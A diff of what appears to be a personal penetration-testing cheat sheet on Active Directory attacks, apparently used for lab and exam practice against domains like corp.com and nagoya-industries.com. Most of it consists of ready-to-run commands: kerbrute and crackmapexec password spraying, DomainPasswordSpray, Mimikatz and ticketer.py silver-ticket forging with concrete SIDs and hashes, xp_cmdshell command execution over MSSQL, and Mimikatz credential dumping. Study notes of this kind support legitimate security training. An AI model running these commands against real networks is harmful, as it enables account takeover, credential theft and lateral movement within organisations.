@@ -455,18 +455,18 @@ This will provide hashes that you will be able to crack.
 /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
 
 PS C:\Tools> type .\usernames.txt
-pete
-dave
-jen
-
 # Validate Usernames
 PS C:\Tools> .\kerbrute_windows_amd64.exe userenum -d corp.com --dc=dc1.corp.com usernames.txt
-
 # Password Spraying
 PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
 
 # If NTLM is enabled, you can use crackmapexec
 kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+```
+
+```bash
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
 ```
 
 #### AS-REP Roasting
@@ -512,12 +512,14 @@ Let's assume that we are performing an assessment and notice that we have Generi
 
 #### Silver Tickets
 
-In general, you need to collect the following three pieces of informaiton to create a sliver ticket:
+In general, you need to collect the following three pieces of informaiton to create a silver ticket:
 	1. SPN password hash
 	2. Domain SID
 	3. Target SPN
 
 If you are a local Administrator on this machine where iis_service (the SPN) has an established session, we can use Mimikatz to retrieve the SPN password hash (NTLM hash of iis_service). If you have the password, you can generate the NTLM hash with codebeautify.org.
+
+You can only use silver ticket against that host.
 
 ```bash
 mimikatz # privilege::debug
@@ -535,21 +537,23 @@ corp\jeff S-1-5-21-1987370270-658905905-1781884369 # ignore this part -1105
 
 mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
 mimikatz # kerberos::golden /sid:S-1-5-21-1969309164-1513403977-1686805993 /user:Administrator /id:500 /domain:nagoya-industries.com /ptt /target:nagoya /service:MSSQL /rc4:e3a0168bc21cfb88b95c954a5b18f57c # i was chris and had the password of svc_mssql user
-
 mimikatz # kerberos::golden /sid:S-1-5-21-1969309164-1513403977-1686805993 /user:Administrator /id:500 /ptt /target:nagoya.nagoya-industries.com /service:MSSQL /rc4:e3a0168bc21cfb88b95c954a5b18f57c # i was chris and had the password of svc_mssql user
-...
-mimikatz # exit
+mimikatz # kerberos::golden /domain: /sid: /aes128: /user:<user_name> /service: /target:
+mimikatz # kerberos::golden /domain: /sid: /aes256: /user:<user_name> /service:  /target:
+mimikatz # kerberos::ptt <ticket_kirbi_file>
+```
 
-# or
-
-ticketer.py -nthash <spn nltm hash> -domain-sid <domain sid> -domain sequel.htb -spn TotesLegit/dc.sequel.htb administrator
+```bash
+ticketer.py -nthash  -domain-sid -domain -spn TotesLegit/dc.sequel.htb administrator
 ticketer.py -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid 'S-1-5-21-1969309164-1513403977-1686805993' -domain $dom -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
+python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
 KRB5CCNAME=administrator.ccache mssqlclient.py  -k administrator@dc.sequel.htb
+KRB5CCNAME=Administrator.ccache mssqlclient.py  -k Administrator@nagoya.nagoya-industries.com
 > enable_xp_cmdshell
 > xp_cmdshell whoami
 ```
 
-YOU MAY NEED TO CREATE AN /etc/krb5user.conf
+You may need to create a /etc/krb5user.conf file.
 
 ```bash
 ┌──(kali㉿kali)-[~/practice/nagoya]
@@ -1199,6 +1203,7 @@ token::elevate /domainadmin
 privilege::debug # Test if ^ is the case
 log
 sekurlsa::logonpasswords # Who has been on the host machine?
+kerberos::list
 lsadump::lsa /inject
 sekurlsa::msv
 sekurlsa::ekeys
@@ -1206,6 +1211,8 @@ lsadump::sam
 lsadump::secrets
 lsadump::cache
 ```
+
+
 
 If you see a username with a "$" at the end, this is a machine account, and cracking these passwords are infeasable at the moment. Look for service to be in Users OU, not Servers.
 
